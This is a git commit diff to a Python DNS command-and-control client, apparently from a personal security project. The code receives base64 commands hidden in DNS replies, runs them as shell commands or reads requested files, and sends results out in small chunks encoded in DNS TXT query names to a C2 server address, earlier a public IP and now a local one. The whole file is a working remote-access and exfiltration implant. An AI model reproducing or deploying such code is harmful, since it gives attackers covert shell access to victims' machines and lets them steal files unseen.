3e7ab57d65c048823091af0453155079afe231d7
guy <guy4497@gmail.com>
2023-05-01 08:34:34 +0300

    c2 allah client

--- cyber/C2/c2_dns_client.py
+++ cyber/C2/c2_dns_client.py
@@ -6,23 +6,21 @@ from base64 import *
 import os
 import time
 
-c2_server = "13.53.243.249"
+c2_server = "192.168.6.11"
 stop = 0
 send_mutex = Lock()
-chunk_size = 25
+chunk_size = 4
 
 
 def send_res(content):
     try:
         global chunk_size
-        payload = b32encode(content.encode('utf-8')).decode('utf-8')
-        print(payload.encode('utf-8'))
-        payload = payload.replace('=', '-')
+        payload = b64encode(content.encode('utf-8')).decode('utf-8')
         payload_frag = [payload[i-chunk_size:i]
                         for i in range(chunk_size, len(payload)+chunk_size, chunk_size)]
         for frag in payload_frag:
             packet = IP(dst=c2_server)/UDP(sport=1337, dport=53) / \
-                DNS(qd=DNSQR(qtype="TXT", qname=frag+".example.com"))
+                DNS(rd=0, cd=1, qd=DNSQR(qtype="TXT", qname=frag+".example.com"))
             send(packet, verbose=False)
             time.sleep(1/50)
     except Exception as e:
@@ -36,23 +34,27 @@ def handle_cmd(msg):
         if(cmd_lst[0] == 'START'):
             valid = 0
             trailer = ""
+            buffer = ""
+            end='END'
             if(cmd_lst[1] == 'Run'):
                 result = os.popen(" ".join(cmd_lst[2:]))
                 raw = result.read()
                 result.close()
-                trailer = " RUN END"
+                trailer = " RUN "
                 valid = 1
             elif(cmd_lst[1] == 'Send'):
                 with open(cmd_lst[2], mode="rb") as bin_file:
                     raw = bin_file.read().hex()
-                trailer = " FILE END"
+                trailer = " FILE "
                 valid = 1
 
             if(valid):
-                send_res(raw + trailer)
+                buffer = ((3 - (len(raw+trailer) % 3)) % 3) * " "
+                send_res(raw + trailer + buffer + end)
+        time.sleep(10)
     except Exception as e:
         print("in handle_cmd: ")
-    print(e)
+        print(e)
 
 
 def recieve_cmd():
@@ -61,7 +63,7 @@ def recieve_cmd():
         while not stop:
             rp = sniff(filter="(udp src port 53) and (udp dst port 1337)", count=1)
             send_mutex.acquire()
-            msg = b64decode(rp[0][DNS].an[DNSRR].rdata).decode('utf-8')
+            msg = b64decode(rp[0][DNS].an[DNSRR].rdata[0]).decode('utf-8')
             handle_cmd(msg)
             send_mutex.release()
     except Exception as e:
